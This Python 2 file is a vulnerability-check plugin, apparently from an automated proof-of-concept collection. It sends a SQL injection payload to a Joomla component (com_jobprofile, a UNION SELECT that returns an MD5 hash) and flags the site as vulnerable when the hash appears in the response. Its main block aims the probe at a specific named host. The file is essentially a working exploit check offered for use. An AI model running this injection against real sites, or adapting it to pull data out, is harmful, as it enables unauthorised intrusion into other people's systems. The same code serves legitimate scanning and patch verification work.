from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'pyphrb'


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg
        _, head, body, _, _ = curl.curl(url + '/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(3.1415),0x3a),3,4,5,6,7,8,9')
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            output(url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_b711cec27176da0d99657efa8b6132ff.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_b711cec27176da0d99657efa8b6132ff.py
#/root/github/poccreate/codesrc/exp-147.py